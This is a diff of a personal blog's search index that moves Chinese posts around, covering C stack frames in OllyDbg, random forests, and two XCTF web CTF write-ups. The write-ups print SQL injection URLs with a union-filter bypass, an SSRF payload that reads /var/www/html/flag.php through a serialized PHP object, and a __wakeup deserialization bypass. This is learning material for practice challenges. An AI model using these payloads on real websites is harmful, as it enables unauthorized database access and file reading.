@@ -106,6 +106,60 @@
       </tags>
   </entry>
   <entry>
+    <title>C语言函数调用栈的变化</title>
+    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
+    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
+<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
+<h2 id="od调试">OD调试</h2>
+<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
+<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
+</figure>
+<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
+</figure>
+<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
+<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
+</figure>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
+</figure>
+<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
+<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
+</figure>
+<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
+</figure>
+<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
+</figure>
+<p>最后执行retn，EIP=0x40152E</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
+</figure>
+<h2 id="总结">总结</h2>
+<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
+<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>reversing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ELF文件解析</title>
     <url>/2021/11/12/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[<figure>
@@ -317,60 +371,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C语言函数调用栈的变化</title>
-    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
-    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
-<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
-<h2 id="od调试">OD调试</h2>
-<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
-<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
-</figure>
-<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
-</figure>
-<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
-<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
-</figure>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
-</figure>
-<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
-<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
-</figure>
-<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
-</figure>
-<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
-</figure>
-<p>最后执行retn，EIP=0x40152E</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
-</figure>
-<h2 id="总结">总结</h2>
-<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
-<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>reversing</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Word2vec</title>
     <url>/2021/10/17/word2vec.html</url>
     <content><![CDATA[<figure>
@@ -415,6 +415,154 @@
 ]]></content>
       <categories>
         <category>deep_learning</category>
+      </categories>
+      <tags>
+        <tag>model</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xctf-fakebook</title>
+    <url>/2021/11/12/xctf-fakebook.html</url>
+    <content><![CDATA[<p>攻防世界-web-fakebook结题过程</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h3 id="使用dirmap扫描">使用dirmap扫描</h3>
+<p>查看网页，发现只有login和join两个功能，扫描结果：<img src="/images/xctf-fakebook/2348945-20210803091934485-1631918819.png" /></p>
+<p>login用于登录，join.php用于注册用户，view.php</p>
+<p>因为刚开始使用dirmap，字典很差很多没扫出来，尤其是flag.php</p>
+<h3 id="寻找注入点爆破">寻找注入点爆破</h3>
+<ol type="1">
+<li><p>注册登录后进入<code>http://111.200.241.244:54207/view.php?no=1</code>，可能存在注入，可以尝试一下，但是目前只有一个用户。<img src="/images/xctf-fakebook/2348945-20210803092319661-797664669.png" alt="image-20210803092317796" style="zoom: 50%;" /></p></li>
+<li><p><code>http://111.200.241.244:54207/view.php?no=2-1</code>，页面不变，发现是数字型注入。</p></li>
+<li><p>使用<code>http://111.200.241.244:54207/view.php?no=1%20order by 4 %23</code>,返回，列数为4.</p></li>
+<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20select%201,2,3,4%20%23</code></p>
+<p>联合查询被检测到了。<img src="/images/xctf-fakebook/2348945-20210803092855345-1138880396.png" alt="image-20210803092853586" /></p></li>
+<li><p>试试布尔盲注<code>http://111.200.241.244:54207/view.php?no=1%20and%200%20%23</code>成功了。下面又试试这个成功了。写代码是不能的，还是直接sqlmap来的快。尝试了一下发现响应太慢？？？？不得行啊。 手动发现数据库名长度为8，难道真的要依次试试嘛。第一个字符为f，难道就是flag？</p>
+<p>发现正确的，响应时间很长，错误的响应时间很短。应该就是fakebook就是这个嘛 。</p>
+<figure>
+<img src="./images/xctf-fakebook/2348945-20210803093525594-61070285.png" alt="image-20210803093523771" /><figcaption aria-hidden="true">image-20210803093523771</figcaption>
+</figure></li>
+<li><p>又试试报错，显示了报错信息。但是又不能使用updatexml，其他的没试。<img src="/images/xctf-fakebook/2348945-20210803093258691-1812634557.png" alt="image-20210803093256905" /></p>
+<figure>
+<img src="./images/xctf-fakebook/2348945-20210803093102514-1853772178.png" alt="image-20210803093100610" /><figcaption aria-hidden="true">image-20210803093100610</figcaption>
+</figure></li>
+<li><p>百度了一下，发现union select过滤的绕过可以使用union all select 绕过。或者union\**<img src="/images/xctf-fakebook/2348945-20210803095205266-1077013596.png" alt="image-20210803095203278" /></p></li>
+<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%22fakebook%22%20%23</code></p>
+<p>发现users表</p></li>
+<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%22users%22%20%23</code><img src="/images/xctf-fakebook/2348945-20210803095411100-648756374.png" alt="image-20210803095409210" /></p></li>
+<li><p>data列中是O:8:"UserInfo":3:{s:4:"name";s:5:"jason";s:3:"age";i:0;s:4:"blog";s:9:"jason.com";} 明显是用户类序列化的结果。不对啊，我要的是flag啊，这是啥啊。还是看writeup把，好家伙user.php.bak没扫出来，字典垃圾了，赶紧加上。</p></li>
+<li><p>查看user.php.bak，大概就是view.php中的内容，核心在有一个网络请求blog中。</p></li>
+<li><p>根据扫描结果可以知道根目录下有一个flag.php但是浏览器打开啥也没有。</p></li>
+<li><p>使用SSRF服务器端请求伪造，view.php让它去请求flag.php就可以了，猜测flag.php的实际路径为<code>/var/www/html/flag.php</code>构造file协议<code>file:///var/www/html/flag.php</code></p></li>
+<li><p>payload:</p>
+<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3</span><br><span class="line">&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.p</span><br><span class="line">hp&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p></li>
+<li><p>flag:<img src="/images/xctf-fakebook/2348945-20210803115421633-1711242055.png" alt="image-20210803115419560" /></p>
+<p>iframe中的base64编码数据解码之后也可以看到flag</p></li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xctf-unserialize3</title>
+    <url>/2021/11/12/xctf-unserialize3.html</url>
+    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h3 id="序列化和反序列化">序列化和反序列化</h3>
+<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
+<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
+<h4 id="例子">例子：</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure>
+<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
+<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
+<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
+<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
+<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
+<h3 id="魔法函数">魔法函数</h3>
+<figure>
+<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
+</figure>
+<h3 id="题目分析">题目分析</h3>
+<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
+<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
+<p>code可能是XCTF类序列化再反序列化的结果</p>
+<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
+<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RandomForest</title>
+    <url>/2021/10/17/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.html</url>
+    <content><![CDATA[<h2 id="决策树">决策树</h2>
+<p>先来复习一下决策树，根据预测结果不同，决策树分为回归决策树和分类决策树。很多的决策树集成，就成为了森林。常见的算法有随机森林和GDBT。</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<p>决策树是一种树形结构每个内部分支都是基于一个属性，每个叶节点代表一种类型。其实决策树就是在将一个多维（特征个数）空间进行划分，切分，产生不同类别。</p>
+<h3 id="分类决策树">分类决策树</h3>
+<p>分类决策树本身就是通过计算信息增益，选择特征，根据特征的值的个数形成分支，剪支（还没学）。</p>
+<p><span class="math inline">\(x_i\)</span>代表某个特征的取值，<span class="math inline">\(P(x_i)\)</span>代表该类型的占比，<strong>信息熵</strong>衡量的是该特征的<strong>混乱程度</strong>，公式：</p>
+<p>​ <span class="math display">\[H(X)=-\sum_{i=1}^{n}p(x_i)log p(x_i)\]</span></p>
+<p>决策树要做的就是通过对比使用每个特征进行分支产生的信息增益--信息熵的减少程度来选择特征。</p>
+<p>参考：<a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
+<h3 id="回归决策树">回归决策树</h3>
+<h3 id="classification-and-regression-tree-cart">（classification and regression tree, CART）</h3>
+<p>这里复习一下<strong>回归和拟合的区别</strong>：</p>
+<p>回归分析：是一种统计学上分析数据的方法，目的在于了解两个或多个变量间<strong>是否相关</strong>、<strong>相关方向与强度</strong>，并建立数学模型以便观察特定变量来预测研究者感兴趣的变量。</p>
+<p>拟合：是一种把现有数据透过数学方法来代入<strong>一条数式</strong>的表示方式。</p>
+<p>回归决策树将一个内部节点中的所有数据的该特征的平均值作为预测值。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925133815973-632336899.png" alt="img" style="zoom: 50%;" /></p>
+<figure>
+<img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925132930783-421450240.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h2 id="随机森林算法random-forestrf">随机森林算法（random forest,RF）</h2>
+<h3 id="简介">简介</h3>
+<p>随机森林是一种基于集成学习的思想和决策树模型而产生的分类器。<strong>集成学习（Ensemble Learning）</strong>通过使用多个弱分类器，来组成一个强分类器，提高准确率。使用多个不同决策树<strong>独立</strong>的决策结果，少数服从多数的方法来分类。</p>
+<p>少数优秀的树的预测结果将会超脱于芸芸“噪音”，做出一个好的预测。将若干个弱分类器的分类结果进行投票选择，从而组成一个强分类器，这就是随机森林<strong>bagging</strong>的思想。bagging的代价是不用单棵决策树来做预测，<strong>具体哪个变量起到重要作用变得未知</strong>，所以bagging<strong>改进了预测准确率但损失了解释性</strong>。</p>
+<h3 id="决策树生成规则">决策树生成规则</h3>
+<ol type="1">
+<li>如果训练集大小为N，对于每棵树而言，随机且有放回地从训练集中的抽取N个训练样本（这种采样方式称为bootstrap sample方法），作为该树的训练集；（<strong>bootstrap sample取样方法</strong>，随机有放回）</li>
+<li>如果每个样本的特征维度为M，指定一个常数m&lt;&lt;M，随机地从M个特征中选取m个特征子集，每次树进行分裂时，从这m个特征中选择最优的；</li>
+<li>每棵树都尽最大程度的生长，并且没有剪枝过程。</li>
+</ol>
+<p><strong>解释</strong>：随机抽样可以让<strong>每个决策树使用的数据集不同</strong>，给出不同的预测结果。有放回不至于让每个决策树得到数据集中的一部分，这样的结果是<strong>片面的</strong>。</p>
+<p>两个随机：随机取样和随机取m个特征。</p>
+<h3 id="分类效果">分类效果</h3>
+<ul>
+<li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li>
+<li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li>
+</ul>
+<p>　　减小特征选择个数m，树的相关性和分类能力也会相应的降低；增大m，两者也会随之增大。所以关键问题是如何选择最优的m（或者是范围），这也是随机森林唯一的一个参数。</p>
+<h3 id="袋外错误率out-of-bag-error">袋外错误率（out of bag error）</h3>
+<p>袋外错误率主要用于选取最佳的m值。</p>
+<p>对每个样本，使用没有选择这个样本的决策树进行预测，使用少数服从多数的方法，得到预测结果。</p>
+<p>最终得到每个样本是否被正确预测，计算袋外错误率。</p>
+<h3 id="代码使用">代码使用</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">rfc = RandomForestClassifier(n_estimators=<span class="number">100</span>)<span class="comment">#树的数量</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考">参考</h2>
+<p><a href="https://zhuanlan.zhihu.com/p/373879791">决策树之分类树与回归树 - 知乎 (zhihu.com)</a></p>
+<p>[<a href="https://zhuanlan.zhihu.com/p/406627649">机器学习基础复习] 随机森林(Random Forest) - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/cpc784221489/article/details/92085702">(12条消息) 随机森林算法详解_阿斯达克-CSDN博客_随机森林详解</a></p>
+<p>https://www.zhihu.com/question/24904495/answer/371618173</p>
+]]></content>
+      <categories>
+        <category>machine_learning</category>
       </categories>
       <tags>
         <tag>model</tag>
@@ -673,154 +821,6 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xctf-fakebook</title>
-    <url>/2021/11/12/xctf-fakebook.html</url>
-    <content><![CDATA[<p>攻防世界-web-fakebook结题过程</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h3 id="使用dirmap扫描">使用dirmap扫描</h3>
-<p>查看网页，发现只有login和join两个功能，扫描结果：<img src="/images/xctf-fakebook/2348945-20210803091934485-1631918819.png" /></p>
-<p>login用于登录，join.php用于注册用户，view.php</p>
-<p>因为刚开始使用dirmap，字典很差很多没扫出来，尤其是flag.php</p>
-<h3 id="寻找注入点爆破">寻找注入点爆破</h3>
-<ol type="1">
-<li><p>注册登录后进入<code>http://111.200.241.244:54207/view.php?no=1</code>，可能存在注入，可以尝试一下，但是目前只有一个用户。<img src="/images/xctf-fakebook/2348945-20210803092319661-797664669.png" alt="image-20210803092317796" style="zoom: 50%;" /></p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=2-1</code>，页面不变，发现是数字型注入。</p></li>
-<li><p>使用<code>http://111.200.241.244:54207/view.php?no=1%20order by 4 %23</code>,返回，列数为4.</p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20select%201,2,3,4%20%23</code></p>
-<p>联合查询被检测到了。<img src="/images/xctf-fakebook/2348945-20210803092855345-1138880396.png" alt="image-20210803092853586" /></p></li>
-<li><p>试试布尔盲注<code>http://111.200.241.244:54207/view.php?no=1%20and%200%20%23</code>成功了。下面又试试这个成功了。写代码是不能的，还是直接sqlmap来的快。尝试了一下发现响应太慢？？？？不得行啊。 手动发现数据库名长度为8，难道真的要依次试试嘛。第一个字符为f，难道就是flag？</p>
-<p>发现正确的，响应时间很长，错误的响应时间很短。应该就是fakebook就是这个嘛 。</p>
-<figure>
-<img src="./images/xctf-fakebook/2348945-20210803093525594-61070285.png" alt="image-20210803093523771" /><figcaption aria-hidden="true">image-20210803093523771</figcaption>
-</figure></li>
-<li><p>又试试报错，显示了报错信息。但是又不能使用updatexml，其他的没试。<img src="/images/xctf-fakebook/2348945-20210803093258691-1812634557.png" alt="image-20210803093256905" /></p>
-<figure>
-<img src="./images/xctf-fakebook/2348945-20210803093102514-1853772178.png" alt="image-20210803093100610" /><figcaption aria-hidden="true">image-20210803093100610</figcaption>
-</figure></li>
-<li><p>百度了一下，发现union select过滤的绕过可以使用union all select 绕过。或者union\**<img src="/images/xctf-fakebook/2348945-20210803095205266-1077013596.png" alt="image-20210803095203278" /></p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%22fakebook%22%20%23</code></p>
-<p>发现users表</p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%22users%22%20%23</code><img src="/images/xctf-fakebook/2348945-20210803095411100-648756374.png" alt="image-20210803095409210" /></p></li>
-<li><p>data列中是O:8:"UserInfo":3:{s:4:"name";s:5:"jason";s:3:"age";i:0;s:4:"blog";s:9:"jason.com";} 明显是用户类序列化的结果。不对啊，我要的是flag啊，这是啥啊。还是看writeup把，好家伙user.php.bak没扫出来，字典垃圾了，赶紧加上。</p></li>
-<li><p>查看user.php.bak，大概就是view.php中的内容，核心在有一个网络请求blog中。</p></li>
-<li><p>根据扫描结果可以知道根目录下有一个flag.php但是浏览器打开啥也没有。</p></li>
-<li><p>使用SSRF服务器端请求伪造，view.php让它去请求flag.php就可以了，猜测flag.php的实际路径为<code>/var/www/html/flag.php</code>构造file协议<code>file:///var/www/html/flag.php</code></p></li>
-<li><p>payload:</p>
-<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3</span><br><span class="line">&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.p</span><br><span class="line">hp&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p></li>
-<li><p>flag:<img src="/images/xctf-fakebook/2348945-20210803115421633-1711242055.png" alt="image-20210803115419560" /></p>
-<p>iframe中的base64编码数据解码之后也可以看到flag</p></li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xctf-unserialize3</title>
-    <url>/2021/11/12/xctf-unserialize3.html</url>
-    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h3 id="序列化和反序列化">序列化和反序列化</h3>
-<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
-<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
-<h4 id="例子">例子：</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
-<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
